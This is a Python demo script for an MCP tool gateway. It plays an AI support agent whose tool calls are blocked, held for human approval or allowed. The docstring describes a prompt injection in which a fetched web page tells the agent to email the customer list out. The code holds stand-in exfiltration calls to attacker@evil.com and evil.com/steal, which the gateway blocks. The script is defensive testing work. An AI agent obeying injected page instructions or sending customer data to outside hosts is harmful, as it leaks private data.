"""Demo: a vulnerable agent, then the same agent protected.

Starts the fake MCP server and the gateway, then plays an agent
that tries calls across three sessions. Without the gateway, every
one of them would reach the tool server. With it:
  Session A (the v0.1 story):
    1. crm.read_customer — allowed
    2. email.send to an external domain — BLOCKED
    3. email.send inside the company — allowed
    4. refund.create for 150 — HELD for a human
    5. refund.create for 50 — allowed
    6. db.delete_all — BLOCKED (not in the capabilities)
  Session B (taint — the injection demo):
    7. web.fetch a company page — allowed, but the page tells the
       agent to email the customer list out. The session is now
       tainted.
    8. email.send to an external domain — BLOCKED, because the
       session is tainted (the injection cannot exfiltrate).
    9. email.send inside the company — still allowed.
  Session C (egress + approval):
    10. web.fetch an outside URL — BLOCKED by the egress allowlist.
    11. refund.create for 150 — HELD; a human approves it through
        the admin API; the agent re-sends with the approval id and
        it goes through.
Then it prints the audit log and verifies the hash chain.

Run: python demo.py
"""
from __future__ import annotations

import json
import tempfile
import threading
import time

import httpx
import uvicorn

from gateway.demo_server import create_demo_server
from gateway.proxy import Gateway, create_app

AGENT_KEY = "demo-key-support-bot"
ADMIN_KEY = "demo-admin-secret"
UPSTREAM = "http://127.0.0.1:8001/mcp"


def _serve(app, port):
    uvicorn.run(app, host="127.0.0.1", port=port, log_level="error")


def _call(client, tool, args, session="default", approval_id=None):
    params = {"name": tool, "arguments": args}
    if approval_id:
        params["approval_id"] = approval_id
    resp = client.post(
        "http://127.0.0.1:8000/mcp",
        headers={"x-agent-key": AGENT_KEY, "x-session-id": session},
        json={"jsonrpc": "2.0", "id": 1, "method": "tools/call",
              "params": params})
    body = resp.json()
    if "error" in body:
        return f"BLOCKED — {body['error']['message']}", None
    result = body.get("result", {})
    if result.get("held_for_approval"):
        return (f"HELD — {result['reason']} "
                f"(approval {result['approval_id']})",
                result["approval_id"])
    content = result.get("content", [{}])[0].get("text", str(result))
    return f"ALLOWED — {content}", None


def main() -> None:
    threading.Thread(target=_serve,
                     args=(create_demo_server(), 8001),
                     daemon=True).start()
    # a fresh data dir each run, so taint and approvals from a
    # previous run do not leak into this one
    tmp = tempfile.mkdtemp(prefix="agent-gateway-demo-")
    gateway = Gateway(policy_dir="policies",
                      keys={AGENT_KEY: "support-bot"},
                      upstream_url=UPSTREAM,
                      audit_path=f"{tmp}/audit.jsonl",
                      data_dir=tmp,
                      admin_key=ADMIN_KEY)
    threading.Thread(target=_serve,
                     args=(create_app(gateway), 8000),
                     daemon=True).start()
    time.sleep(1.5)
    client = httpx.Client(timeout=10, trust_env=False)
    admin = {"x-admin-key": ADMIN_KEY}

    print("== Session A: the v0.1 story ==")
    for tool, args in [
            ("crm.read_customer", {"customer_id": "cust_1", "limit": 5}),
            ("email.send", {"to": "attacker@evil.com", "subject": "x",
                            "body": "exfiltrate"}),
            ("email.send", {"to": "team@company.com", "subject": "hi",
                            "body": "hello"}),
            ("refund.create", {"customer_id": "cust_1", "amount": 150}),
            ("refund.create", {"customer_id": "cust_1", "amount": 50}),
            ("db.delete_all", {})]:
        text, _ = _call(client, tool, args, session="A")
        print(f"{tool} {json.dumps(args)}\n  {text}")

    print("== Session B: the injection demo ==")
    text, _ = _call(client, "web.fetch",
                    {"url": "https://docs.company.com/help"},
                    session="B")
    print(f"web.fetch docs.company.com\n  {text}")
    text, _ = _call(client, "email.send",
                    {"to": "attacker@evil.com", "subject": "list",
                     "body": "customer list"}, session="B")
    print(f"email.send to attacker@evil.com (after the fetch)\n  {text}")
    text, _ = _call(client, "email.send",
                    {"to": "team@company.com", "subject": "hi",
                     "body": "hello"}, session="B")
    print(f"email.send to team@company.com (tainted, but internal)\n  {text}")

    print("== Session C: egress + approval ==")
    text, _ = _call(client, "web.fetch",
                    {"url": "https://evil.com/steal"}, session="C")
    print(f"web.fetch evil.com\n  {text}")
    text, approval_id = _call(
        client, "refund.create", {"customer_id": "cust_1", "amount": 150},
        session="C")
    print(f"refund.create 150\n  {text}")
    client.post(f"http://127.0.0.1:8000/admin/approvals/{approval_id}/approve",
                headers=admin)
    text, _ = _call(client, "refund.create",
                    {"customer_id": "cust_1", "amount": 150},
                    session="C", approval_id=approval_id)
    print(f"refund.create 150 (re-sent with the approval id)\n  {text}")

    ok, message = gateway.audit.verify()
    print(f"\naudit log: {message} (chain {'intact' if ok else 'BROKEN'})")
    for entry in gateway.audit.read():
        taint = " [tainted]" if entry.get("tainted") else ""
        print(f"  #{entry['seq']} {entry['agent']} {entry['tool']} "
              f"-> {entry['decision']}{taint}")


if __name__ == "__main__":
    main()
